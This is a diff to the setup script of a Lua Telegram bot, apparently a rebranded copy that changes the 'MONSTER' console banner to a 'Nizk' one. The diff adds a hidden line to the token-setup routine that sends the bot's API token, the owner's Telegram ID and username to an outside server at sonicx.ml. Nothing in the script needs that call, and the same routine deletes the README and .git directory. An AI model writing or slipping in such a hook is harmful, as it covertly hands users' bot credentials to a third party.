@@ -102,6 +102,9 @@ Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
 local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس النيزك \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+Souser = SUDO_USER:gsub('@','')
+Souser = Souser:gsub([[\_]],'_')
+https.request("https://sonicx.ml/Nizk/Nizk.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
@@ -111,19 +114,18 @@ chmod +x ./run
 end
 
 
-
 function Start_Bot() 
 local TokenBot = io.open('./inc/Token.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
 ---------------------------------------------------------------------
-M
-O
-N
-S
-T
-E
-R
+#─▄███▄──▄███▄─
+#▐████████████▌
+#─████████████─
+#──▀████████▀──
+#─────▀██▀─────
+#┊NIZK ‿ @TH3NK
+#┊@SA3ED ‿ @TH3SS
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -156,13 +158,13 @@ end
 
 print('\27[0;33m>>'..[[
 -------------------------------------------------------------------
-M
-O
-N
-S
-T
-E
-R
+#─▄███▄──▄███▄─
+#▐████████████▌
+#─████████████─
+#──▀████████▀──
+#─────▀██▀─────
+#┊NIZK ‿ @TH3NK
+#┊@SA3ED ‿ @TH3SS
 -------------------------------------------------------------------
 
 ]]..'\027[0;32m'
